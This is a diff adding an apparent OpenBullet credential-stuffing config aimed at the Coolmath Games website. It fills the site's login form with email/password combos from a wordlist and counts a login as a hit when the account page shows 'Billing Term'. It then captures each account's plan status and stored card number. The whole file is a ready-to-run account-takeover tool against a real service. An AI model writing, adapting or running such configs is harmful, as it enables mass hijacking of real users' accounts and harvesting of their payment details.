@@ -1,0 +1,60 @@
+[SETTINGS]
+{
+  "Name": "coolmathgames",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-02T12:40:10.4403527-07:00",
+  "AdditionalInfo": "",
+  "Author": "Coaster",
+  "Version": "1.2.6 [Paradox Mod]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.coolmathgames.com/user/login" 
+  CONTENT "form_build_id=form-_7mSipWq_ZdvR8axo20eRY4wviXswCL4MOfFWk6ZbXE&form_id=user_login&name=<USER>&pass=<PASS>&remember_me=1&op=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.coolmathgames.com" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://www.coolmathgames.com/user/login" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7" 
+  HEADER "cache-control: no-cache" 
+  HEADER "content-length: 156" 
+
+REQUEST GET "https://www.coolmathgames.com/myaccount" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "Billing Term" 
+  KEYCHAIN Success OR 
+    KEY "Billing Term" 
+
+PARSE "<SOURCE>" LR "label\">Status: </div><div class=\"myacct-field-value\">" "</div></div>" -> CAP "Plan Type" 
+
+PARSE "<SOURCE>" LR "\">Card number: </div><div class=\"myacct-field-value\">" "</div></div>" -> CAP "Credit Card" 
+
